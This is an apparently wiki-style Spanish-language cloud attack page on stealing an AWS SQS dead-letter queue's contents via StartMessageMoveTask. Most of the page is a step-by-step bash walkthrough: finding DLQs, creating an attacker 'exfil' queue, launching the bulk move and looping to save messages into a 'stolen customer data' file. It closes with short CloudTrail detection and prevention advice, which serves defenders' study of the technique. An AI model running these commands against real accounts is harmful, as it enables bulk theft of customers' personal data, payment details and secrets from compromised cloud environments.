# AWS – SQS DLQ Exfiltración Redrive vía StartMessageMoveTask

## Description

Abusar de las tareas de movimiento de mensajes de SQS para robar todos los mensajes acumulados de la Dead-Letter Queue (DLQ) de una víctima redirigiéndolos a una cola controlada por el atacante usando `sqs:StartMessageMoveTask`. Esta técnica explota la funcionalidad legítima de recuperación de mensajes de AWS para exfiltrar datos sensibles que se han acumulado en las DLQ con el tiempo.

## What is a Dead-Letter Queue (DLQ)?

Una Dead-Letter Queue es una cola SQS especial donde los mensajes se envían automáticamente cuando no pueden ser procesados correctamente por la aplicación principal. Estos mensajes fallidos a menudo contienen:
- Datos sensibles de la aplicación que no pudieron ser procesados
- Detalles de errores e información para depuración
- Información de identificación personal (PII)
- Tokens de API, credenciales u otros secretos
- Datos de transacciones críticos para el negocio

Las DLQ actúan como un "cementerio" para mensajes fallidos, por lo que son objetivos valiosos ya que acumulan datos sensibles con el tiempo que las aplicaciones no pudieron manejar correctamente.

## Attack Scenario

**Real-world example:**
1. **E-commerce application** procesa pedidos de clientes a través de SQS
2. **Some orders fail** (problemas de pago, inventario, etc.) y se mueven a una DLQ
3. **DLQ accumulates** semanas/meses de pedidos fallidos que contienen datos de clientes: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Attacker gains access** a credenciales AWS con permisos SQS
5. **Attacker discovers** que la DLQ contiene miles de pedidos fallidos con datos sensibles
6. **Instead of trying to access individual messages** (lento y obvio), el atacante usa `StartMessageMoveTask` para transferir a granel TODOS los mensajes a su propia cola
7. **Attacker extracts** todos los datos históricos sensibles en una sola operación

## Requirements
- La cola origen debe estar configurada como DLQ (referenciada por al menos una RedrivePolicy de alguna cola).
- Permisos IAM (ejecutados como el principal de la víctima comprometida):
- En la DLQ (origen): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- En la cola de destino: permiso para entregar mensajes (por ejemplo, política de cola que permita `sqs:SendMessage` desde el principal de la víctima). Para destinos en la misma cuenta esto normalmente está permitido por defecto.
- Si SSE-KMS está habilitado: en la CMK de origen `kms:Decrypt`, y en la CMK de destino `kms:GenerateDataKey`, `kms:Encrypt`.

## Impact
Exfiltración de cargas útiles sensibles acumuladas en DLQ (eventos fallidos, PII, tokens, payloads de aplicación) a alta velocidad usando APIs nativas de SQS. Funciona cross-account si la política de la cola de destino permite `SendMessage` desde el principal de la víctima.

## How to Abuse

- Identificar el ARN de la DLQ de la víctima y asegurarse de que realmente esté referenciada como DLQ por alguna cola (cualquier cola sirve).
- Crear o elegir una cola de destino controlada por el atacante y obtener su ARN.
- Iniciar una tarea de movimiento de mensajes desde la DLQ de la víctima hacia tu cola de destino con StartMessageMoveTask.
- Monitorizar el progreso o cancelar si es necesario.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: Un atacante ha comprometido credenciales AWS y ha descubierto que una aplicación de e-commerce usa SQS con una DLQ que contiene intentos fallidos de procesamiento de pedidos de clientes.

1) **Discover and examine the victim DLQ**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Crear una cola de destino controlada por el atacante**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Ejecutar el bulk message theft**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Recopilar los datos sensibles robados**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Notas entre cuentas
- La cola de destino debe tener una política de recursos que permita al principal de la víctima realizar `sqs:SendMessage` (y, si se usa, concesiones/permisos de KMS).

## Por qué este ataque es efectivo

1. **Característica legítima de AWS**: Utiliza funcionalidad integrada de AWS, lo que dificulta detectarlo como malicioso
2. **Operación masiva**: Transfiere miles de mensajes rápidamente en lugar de acceso individual y lento
3. **Datos históricos**: Las DLQs acumulan datos sensibles durante semanas/meses
4. **Fuera del radar**: Muchas organizaciones no supervisan de cerca el acceso a las DLQs
5. **Capaz entre cuentas**: Puede exfiltrate a la propia cuenta AWS del atacante si los permisos lo permiten

## Detección y prevención

### Detección
Supervisar CloudTrail en busca de llamadas API `StartMessageMoveTask` sospechosas:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Prevención
1. **Principio de privilegio mínimo**: Restringe los permisos `sqs:StartMessageMoveTask` solo a los roles necesarios
2. **Monitoreo de DLQs**: Configura alarmas de CloudWatch para actividad inusual en las DLQs
3. **Políticas entre cuentas**: Revisa cuidadosamente las políticas de las colas SQS que permiten acceso entre cuentas
4. **Cifra las DLQs**: Usa SSE-KMS con políticas de claves restringidas
5. **Limpieza regular**: No permitas que datos sensibles se acumulen en las DLQs indefinidamente
